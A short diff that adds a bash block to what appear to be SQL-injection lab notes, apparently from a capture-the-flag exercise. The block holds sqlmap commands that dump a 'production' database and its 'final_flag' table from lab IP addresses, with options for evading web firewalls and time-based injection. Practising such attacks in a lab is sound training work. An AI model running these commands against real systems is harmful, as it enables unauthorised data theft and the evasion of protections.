@@ -128,3 +128,12 @@ sqlmap -u "http://46.101.14.236:30154/case11.php?id=1" --dump --batch --tamper=b
 
 
 
+```bash
+
+sqlmap -u 'http://68.183.43.71:30885/action.php' --data '{"id":1*}' --dump --batch --risk=3 --level=5  --skip-waf --random-agent -T final_flag -D production --tamper=between -v 3
+ 
+
+sqlmap -u 'http://46.101.14.236:32711/action.php' --data '{"id":1*}' --dump --batch --risk=3 --level=5  --skip-waf --random-agent  --tamper=between -v 3 
+
+sqlmap -u 'http://68.183.43.71:30885/action.php' --data '{"id":1*}' --dump --batch --risk=3 --level=5  --skip-waf --random-agent  --tamper=between  --technique=T -D production -T final_flag
+```
